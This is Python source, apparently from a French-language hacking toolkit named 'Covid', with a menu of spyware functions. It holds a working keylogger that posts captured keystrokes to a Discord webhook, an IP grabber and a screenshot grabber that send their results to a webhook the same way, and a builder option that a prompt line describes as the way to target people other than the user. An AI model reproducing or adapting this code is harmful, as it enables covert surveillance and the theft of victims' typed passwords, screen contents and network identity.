import os
import time
import requests
import json
import threading
import io
import mss
import mss.tools
from pynput import keyboard
from colorama import Fore
from builder import builder
from code.commands.utils import show_informations


def run_covid():
    while True:
        os.system("cls")
        covid = input(f"""{Fore.RED}
                 ██████╗ ██████╗ ██╗   ██╗██╗██████╗      ██╗ █████╗
                ██╔════╝██╔═══██╗██║   ██║██║██╔══██╗    ███║██╔══██╗
                ██║     ██║   ██║██║   ██║██║██║  ██║    ╚██║╚██████║
                ██║     ██║   ██║╚██╗ ██╔╝██║██║  ██║     ██║ ╚═══██║
                ╚██████╗╚██████╔╝ ╚████╔╝ ██║██████╔╝     ██║ █████╔╝
                ╚═════╝ ╚═════╝   ╚═══╝  ╚═╝╚═════╝      ╚═╝ ╚════╝

                1. [KeyLogger]  4. [Build Covid]
                2. [Grabing IP] 5. [Quit]
                3. [ScreenShot]

                Fais ton choix : """)

        if covid == "1":
            os.system("cls")
            webhook = input(f"""{Fore.RED}

                ▄████▄   ▒█████   ██▒   █▓ ██▓▓█████▄     ██▓     ▒█████    ▄████ ▓█████  ██▀███
                ▒██▀ ▀█  ▒██▒  ██▒▓██░   █▒▓██▒▒██▀ ██▌   ▓██▒    ▒██▒  ██▒ ██▒ ▀█▒▓█   ▀ ▓██ ▒ ██▒
                ▒▓█    ▄ ▒██░  ██▒ ▓██  █▒░▒██▒░██   █▌   ▒██░    ▒██░  ██▒▒██░▄▄▄░▒███   ▓██ ░▄█ ▒
                ▒▓▓▄ ▄██▒▒██   ██░  ▒██ █░░░██░░▓█▄   ▌   ▒██░    ▒██   ██░░▓█  ██▓▒▓█  ▄ ▒██▀▀█▄
                ▒ ▓███▀ ░░ ████▓▒░   ▒▀█░  ░██░░▒████▓    ░██████▒░ ████▓▒░░▒▓███▀▒░▒████▒░██▓ ▒██▒
                ░ ░▒ ▒  ░░ ▒░▒░▒░    ░ ▐░  ░▓   ▒▒▓  ▒    ░ ▒░▓  ░░ ▒░▒░▒░  ░▒   ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░
                ░  ▒     ░ ▒ ▒░    ░ ░░   ▒ ░ ░ ▒  ▒    ░ ░ ▒  ░  ░ ▒ ▒░   ░   ░  ░ ░  ░  ░▒ ░ ▒░
                ░        ░ ░ ░ ▒       ░░   ▒ ░ ░ ░  ░      ░ ░   ░ ░ ░ ▒  ░ ░   ░    ░     ░░   ░
                ░ ░          ░ ░        ░   ░     ░           ░  ░    ░ ░        ░    ░  ░   ░
                ░                      ░        ░

                Met ton webhook (Pour tester sur des gens autre que vous allez sur le covid builder): """)
            os.system("cls")

            buffer = ""
            timer = None

            def send_buffer():
                nonlocal buffer
                if buffer:
                    data = {
                        "content": buffer,
                        "username": "WhiteWolf",
                        "avatar_url": "https://i.postimg.cc/nhfNtJbK/f65aba67730462b50f7ec15c4bdb605d.jpg"
                    }
                    requests.post(webhook, json=data)
                    buffer = ""

            def reset_timer():
                nonlocal timer
                if timer:
                    timer.cancel()
                timer = threading.Timer(1.0, send_buffer)
                timer.start()

            def on_press(key):
                nonlocal buffer
                try:
                    buffer += key.char
                except AttributeError:
                    if key == keyboard.Key.space:
                        buffer += " "
                    elif key == keyboard.Key.enter:
                        buffer += "\n"
                reset_timer()

            listener = keyboard.Listener(on_press=on_press)
            listener.start()
            listener.join()

        elif covid == "2":
            os.system("cls")
            webhook = input(f"""{Fore.RED}
                     ██████╗ ██████╗  █████╗ ██████╗ ██╗███╗   ██╗ ██████╗     ██╗██████╗
                    ██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██║████╗  ██║██╔════╝     ██║██╔══██╗
                    ██║  ███╗██████╔╝███████║██████╔╝██║██╔██╗ ██║██║  ███╗    ██║██████╔╝
                    ██║   ██║██╔══██╗██╔══██║██╔══██╗██║██║╚██╗██║██║   ██║    ██║██╔═══╝
                    ╚██████╔╝██║  ██║██║  ██║██████╔╝██║██║ ╚████║╚██████╔╝    ██║██║
                     ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝╚═╝  ╚═══╝ ╚═════╝    ╚═╝╚═╝

                    Met Ton webhook : """)
            try:
                ip = requests.get("https://checkip.amazonaws.com").text.strip()
                data = {
                    "content": ip,
                    "username": "WhiteWolf",
                    "avatar_url": "https://i.postimg.cc/nhfNtJbK/f65aba67730462b50f7ec15c4bdb605d.jpg"
                }
                requests.post(webhook, json=data)
            except Exception as e:
                print(f"Error {e}")
                time.sleep(3)

        elif covid == "3":
            os.system("cls")
            webhook = input(f"""{Fore.RED}
                    ███████╗ ██████╗██████╗ ███████╗███████╗███╗   ██╗
                    ██╔════╝██╔════╝██╔══██╗██╔════╝██╔════╝████╗  ██║
                    ███████╗██║     ██████╔╝█████╗  █████╗  ██╔██╗ ██║
                    ╚════██║██║     ██╔══██╗██╔══╝  ██╔══╝  ██║╚██╗██║
                    ███████║╚██████╗██║  ██║███████╗███████╗██║ ╚████║
                    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═══╝

                    Met Ton webhook discord : """)
            with mss.mss() as sct:
                img = sct.grab(sct.monitors[1])
                img_bytes = mss.tools.to_png(img.rgb, img.size)
                files = {"file": ("screen.png", io.BytesIO(img_bytes), "image/png")}
                requests.post(webhook, data={
                    "content": "screenshot",
                    "username": "WhiteWolf",
                    "avatar_url": "https://i.postimg.cc/nhfNtJbK/f65aba67730462b50f7ec15c4bdb605d.jpg"
                }, files=files)

        elif covid == "4":
            os.system("cls")
            webhook = input(f"""{Fore.RED}

                ██  ██ ██ █████▄  ██  ██ ▄█████   █████▄ ██  ██ ██ ██     ████▄
                ██▄▄██ ██ ██▄▄██▄ ██  ██ ▀▀▀▄▄▄   ██▄▄██ ██  ██ ██ ██     ██  ██
                 ▀██▀  ██ ██   ██ ▀████▀ █████▀   ██▄▄█▀ ▀████▀ ██ ██████ ████▀

                Met Ton Webhook : """)
            with open("config.json", "w", encoding="utf-8") as f:
                json.dump({"webhook": webhook}, f, ensure_ascii=False, indent=4)
            builder()

        elif covid == "i":
            show_informations()

        elif covid == "5":
            break
